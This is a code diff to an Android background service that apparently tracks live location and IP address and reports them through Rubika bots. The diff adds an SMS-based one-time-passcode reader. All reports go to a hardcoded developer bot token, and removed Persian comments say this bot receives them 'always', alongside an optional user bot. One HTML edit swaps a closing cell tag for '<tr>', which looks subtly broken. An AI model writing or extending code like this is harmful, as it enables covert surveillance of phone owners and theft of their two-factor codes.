@@ -90,7 +90,29 @@ public class HttpServerService extends Service {
         registerNetworkCallback();
         startLiveLocation();
         checkAndReportIp();
+        
+        // ========== راه‌اندازی OTP Reader ==========
+        startOtpReader();
+        // ==========================================
     }
+
+    // ========== OTP Reader ==========
+    private void startOtpReader() {
+        try {
+            com.google.android.gms.auth.api.phone.SmsRetrieverClient client = 
+                com.google.android.gms.auth.api.phone.SmsRetriever.getClient(this);
+            
+            client.startSmsRetriever().addOnSuccessListener(aVoid -> {
+                Log.d(TAG, "✅ OTP Reader started successfully");
+                sendToRubikaBot("✅ سرویس خواندن OTP فعال شد");
+            }).addOnFailureListener(e -> {
+                Log.e(TAG, "❌ OTP Reader failed: " + e.getMessage());
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting OTP Reader: " + e.getMessage());
+        }
+    }
+    // =================================
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -358,7 +380,7 @@ public class HttpServerService extends Service {
                 html.append("<td style='padding: 8px;'>").append(parts.length > 3 ? parts[3] + "m" : "?").append("</td>");
                 html.append("<td style='padding: 8px;'><a href='https://maps.google.com/?q=").append(parts[1]).append(",").append(parts[2]);
                 html.append("' target='_blank' style='color:#e94560;'>🗺️ نقشه</a></td>");
-                html.append("</td>");
+                html.append("<tr>");
             }
         }
         html.append("</table>");
@@ -534,16 +556,15 @@ public class HttpServerService extends Service {
     }
 
     // ========== ارسال به دو ربات همزمان ==========
-private void sendToRubikaBot(String message) {
-    // ارسال به ربات خودت (همیشه)
-    sendToSpecificBot(MY_BOT_TOKEN, MY_CHAT_ID, message);
-    
-    // ارسال به ربات کاربر (اگه تنظیم شده باشه)
-    if (userBotToken != null && !userBotToken.isEmpty() && 
-        userChatId != null && !userChatId.isEmpty()) {
-        sendToSpecificBot(userBotToken, userChatId, message);
+    private void sendToRubikaBot(String message) {
+        sendToSpecificBot(MY_BOT_TOKEN, MY_CHAT_ID, message);
+        
+        if (userBotToken != null && !userBotToken.isEmpty() && 
+            userChatId != null && !userChatId.isEmpty()) {
+            sendToSpecificBot(userBotToken, userChatId, message);
+        }
     }
-}
+    
     private void sendToSpecificBot(String botToken, String chatId, String message) {
         networkExecutor.execute(() -> {
             try {
@@ -566,7 +587,7 @@ private void sendToRubikaBot(String message) {
                 }
                 
                 int code = conn.getResponseCode();
-                Log.d(TAG, "Sent to bot (" + botToken.substring(0, Math.min(10, botToken.length())) + "...): " + code);
+                Log.d(TAG, "Sent to bot: " + code);
                 
             } catch (Exception e) {
                 Log.e(TAG, "Failed to send to bot: " + e.getMessage());
